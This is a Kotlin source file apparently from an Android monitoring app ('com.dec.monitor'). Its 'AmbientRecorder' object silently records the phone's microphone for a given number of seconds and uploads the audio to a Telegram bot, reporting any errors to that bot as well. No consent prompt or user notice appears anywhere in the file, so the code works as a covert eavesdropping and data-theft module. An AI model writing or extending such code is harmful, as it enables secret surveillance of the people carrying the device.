package com.dec.monitor.media

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object AmbientRecorder {

    suspend fun record(context: Context, seconds: Int) = withContext(Dispatchers.IO) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val file = File(context.cacheDir, "ambient_$timestamp.mp3")

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            delay(seconds * 1000L)

            recorder.stop()
            recorder.release()

            TelegramBot.sendAudio(file, "🎙 Ambient recording — ${seconds}s")
        } catch (e: Exception) {
            recorder.release()
            TelegramBot.sendMessage("🎙 Mic recording failed: ${e.message}")
        }
    }
}
